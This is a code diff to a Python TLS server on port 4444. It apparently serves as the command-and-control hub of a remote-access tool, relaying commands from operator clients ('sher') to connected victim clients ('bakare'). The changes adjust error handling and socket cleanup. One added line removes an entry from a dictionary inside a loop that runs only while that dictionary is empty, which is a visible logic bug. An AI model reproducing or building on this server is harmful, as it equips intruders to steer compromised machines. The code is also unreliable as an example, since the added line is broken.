@@ -3,7 +3,6 @@ import threading,time
 import ssl
 active_bakare={}
 active_sher=[]
-# IP='localhost'
 IP=socket.gethostbyname(socket.gethostname())
 PORT=4444
 
@@ -33,6 +32,7 @@ def handle_sher(sher_socket):
         try:
             while len(active_bakare)==0:
                 reliable_send("[-] Bakara Disconnected",sher_socket)
+                active_bakare.pop(n)
                 handle_sher(sher_socket)
             command=reliable_receive(sher_socket)
             if command[0]=="change_bakara":
@@ -47,9 +47,11 @@ def handle_sher(sher_socket):
                 active_bakare.pop(n)
             except:
                 active_sher.remove(sher_socket)
+                sher_socket.close()
                 break
         except Exception as e:
-            print(e)
+            reliable_send('[-] Main Server ERR : \n%s'%str(e),sher_socket)
+            sher_socket.close()
             break
 
 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
